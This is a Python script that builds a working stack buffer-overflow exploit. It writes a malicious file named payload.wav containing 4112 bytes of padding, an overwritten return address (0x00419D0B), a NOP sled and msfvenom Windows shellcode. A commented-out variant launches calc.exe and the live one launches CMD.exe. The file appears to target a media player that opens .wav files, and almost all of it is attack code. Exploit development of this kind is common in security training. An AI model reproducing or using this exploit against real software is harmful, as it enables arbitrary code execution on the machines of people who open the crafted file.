from struct import pack


def badchars():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    # buf = b""
    # buf += b"\xbd\x89\x4e\x6d\xe3\xdb\xdb\xd9\x74\x24\xf4\x58"
    # buf += b"\x31\xc9\xb1\x31\x31\x68\x13\x03\x68\x13\x83\xe8"
    # buf += b"\x75\xac\x98\x1f\x6d\xb3\x63\xe0\x6d\xd4\xea\x05"
    # buf += b"\x5c\xd4\x89\x4e\xce\xe4\xda\x03\xe2\x8f\x8f\xb7"
    # buf += b"\x71\xfd\x07\xb7\x32\x48\x7e\xf6\xc3\xe1\x42\x99"
    # buf += b"\x47\xf8\x96\x79\x76\x33\xeb\x78\xbf\x2e\x06\x28"
    # buf += b"\x68\x24\xb5\xdd\x1d\x70\x06\x55\x6d\x94\x0e\x8a"
    # buf += b"\x25\x97\x3f\x1d\x3e\xce\x9f\x9f\x93\x7a\x96\x87"
    # buf += b"\xf0\x47\x60\x33\xc2\x3c\x73\x95\x1b\xbc\xd8\xd8"
    # buf += b"\x94\x4f\x20\x1c\x12\xb0\x57\x54\x61\x4d\x60\xa3"
    # buf += b"\x18\x89\xe5\x30\xba\x5a\x5d\x9d\x3b\x8e\x38\x56"
    # buf += b"\x37\x7b\x4e\x30\x5b\x7a\x83\x4a\x67\xf7\x22\x9d"
    # buf += b"\xee\x43\x01\x39\xab\x10\x28\x18\x11\xf6\x55\x7a"
    # buf += b"\xfa\xa7\xf3\xf0\x16\xb3\x89\x5a\x7c\x42\x1f\xe1"
    # buf += b"\x32\x44\x1f\xea\x62\x2d\x2e\x61\xed\x2a\xaf\xa0"
    # buf += b"\x4a\xc4\xe5\xe9\xfa\x4d\xa0\x7b\xbf\x13\x53\x56"
    # buf += b"\x83\x2d\xd0\x53\x7b\xca\xc8\x11\x7e\x96\x4e\xc9"
    # buf += b"\xf2\x87\x3a\xed\xa1\xa8\x6e\x8e\x24\x3b\xf2\x7f"
    # buf += b"\xc3\xbb\x91\x7f"

    # msfvenom -p 'windows/exec' CMD='CMD.exe' -f 'python' -b '\x00'

    buf = b""
    buf += b"\xdd\xc3\xd9\x74\x24\xf4\x58\xbd\x41\xb8\x23\x67"
    buf += b"\x2b\xc9\xb1\x31\x83\xc0\x04\x31\x68\x13\x03\x29"
    buf += b"\xab\xc1\x92\x55\x23\x87\x5d\xa5\xb4\xe8\xd4\x40"
    buf += b"\x85\x28\x82\x01\xb6\x98\xc0\x47\x3b\x52\x84\x73"
    buf += b"\xc8\x16\x01\x74\x79\x9c\x77\xbb\x7a\x8d\x44\xda"
    buf += b"\xf8\xcc\x98\x3c\xc0\x1e\xed\x3d\x05\x42\x1c\x6f"
    buf += b"\xde\x08\xb3\x9f\x6b\x44\x08\x14\x27\x48\x08\xc9"
    buf += b"\xf0\x6b\x39\x5c\x8a\x35\x99\x5f\x5f\x4e\x90\x47"
    buf += b"\xbc\x6b\x6a\xfc\x76\x07\x6d\xd4\x46\xe8\xc2\x19"
    buf += b"\x67\x1b\x1a\x5e\x40\xc4\x69\x96\xb2\x79\x6a\x6d"
    buf += b"\xc8\xa5\xff\x75\x6a\x2d\xa7\x51\x8a\xe2\x3e\x12"
    buf += b"\x80\x4f\x34\x7c\x85\x4e\x99\xf7\xb1\xdb\x1c\xd7"
    buf += b"\x33\x9f\x3a\xf3\x18\x7b\x22\xa2\xc4\x2a\x5b\xb4"
    buf += b"\xa6\x93\xf9\xbf\x4b\xc7\x73\xe2\x01\x16\x01\x99"
    buf += b"\x64\x18\x19\xa1\xd8\x71\x28\x2a\xb7\x06\xb5\xf9"
    buf += b"\xf3\xf9\xff\xa3\x52\x92\x59\x36\xe7\xff\x59\xed"
    buf += b"\x24\x06\xda\x07\xd5\xfd\xc2\x62\xd0\xba\x44\x9f"
    buf += b"\xa8\xd3\x20\x9f\x1f\xd3\x60\xdc\xd2\x6f\xa5\x87"
    buf += b"\x94\x0a\xb9"

    offset = 4112
    pad = b"A"
    # eip = b"B" * 4
    eip = pack("L", 0x00419D0B)
    nop = b"\x90" * 32
    payload = offset * pad + eip + nop + buf

    with open("payload.wav", "wb") as f:
        f.write(payload)


badchars()
